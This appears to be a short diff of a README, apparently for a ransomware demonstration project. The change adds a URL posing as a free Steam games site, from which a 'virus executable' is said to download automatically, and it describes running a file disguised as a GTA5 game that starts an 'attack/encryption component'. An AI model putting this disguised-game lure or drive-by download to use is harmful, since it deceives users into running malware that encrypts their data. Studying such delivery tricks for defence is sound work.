@@ -2,7 +2,7 @@
 
 Download the critical folder that consists of random text files into your ~/Download from the github repo provided 
 
-Visit the website to automatically download the virus executable file from ""
+Visit the website to automatically download the virus executable file from "https://free-steam-games.github.io/"
 
 Start excuting the GTA5 executable as follow:
 Running of attack/encryption component 
